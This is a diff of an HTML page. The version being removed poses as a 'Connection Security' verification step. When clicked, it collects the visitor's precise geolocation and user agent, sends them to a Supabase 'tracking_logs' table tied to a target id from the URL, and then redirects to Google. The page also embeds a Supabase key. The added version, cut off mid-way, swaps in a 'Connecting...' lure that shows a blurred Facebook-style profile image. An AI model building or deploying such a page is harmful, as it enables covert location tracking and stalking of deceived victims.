@@ -3,61 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check</title>
+    <title>Connecting...</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 320px; }
-        .btn { background: #007bff; color: white; border: none; padding: 12px 25px; border-radius: 6px; font-size: 16px; cursor: pointer; margin-top: 20px; width: 100%; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; display: none; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 320px; filter: blur(10px); }
+        .btn { background: #3578e5; color: white; border: none; padding: 12px 25px; border-radius: 6px; font-size: 16px; cursor: pointer; margin-top: 20px; width: 100%; display: none; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3578e5; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; display: block; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2 style="margin: 0 0 10px; font-size: 20px;">Connection Security</h2>
-    <p style="color: #666; font-size: 14px;">Please click below to verify your device connection and continue.</p>
-    <div id="loader" class="loader"></div>
-    <button id="verify-btn" class="btn">Verify & Continue</button>
-</div>
-
-<script>
-    const supabaseUrl = 'https://nhhcijrjrcxznsqltzom.supabase.co';
-    const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5oaGNpanJqcmN4em5zcWx0em9tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM5MTMyODAsImV4cCI6MjA4OTQ4OTI4MH0.1CG80rxN01S00lCQ1gkqyKdenDJR_XjM0uQtEAln9XU';
-    const supabaseClient = supabase.createClient(supabaseUrl, supabaseKey);
-
-    const btn = document.getElementById('verify-btn');
-    const loader = document.getElementById('loader');
-
-    btn.addEventListener('click', () => {
-        btn.style.display = 'none';
-        loader.style.display = 'block';
-
-        const urlParams = new URLSearchParams(window.location.search);
-        const targetId = urlParams.get('id') || 'Mobile_User';
-
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                // Supabase-e data pathano
-                await supabaseClient.from('tracking_logs').insert([{ 
-                    user_identifier: targetId, 
-                    latitude: pos.coords.latitude, 
-                    longitude: pos.coords.longitude,
-                    device_info: "Verified Mobile: " + navigator.userAgent
-                }]);
-                
-                // Redirect to Google
-                window.location.replace("https://www.google.com");
-            }, (err) => {
-                // Permission deny korle ba error holeo redirect
-                window.location.replace("https://www.google.com");
-            }, { enableHighAccuracy: true, timeout: 10000 });
-        } else {
-            window.location.replace("https://www.google.com");
-        }
-    });
-</script>
-
-</body>
-</html>
+<div id="main-content" class="card">
+    <div style="margin-bottom: 20px;">
+        <img src="https://i.ibb.co/L5hYwP7/fb-profile-blur.png" alt="Blurred Profile" width="100%">
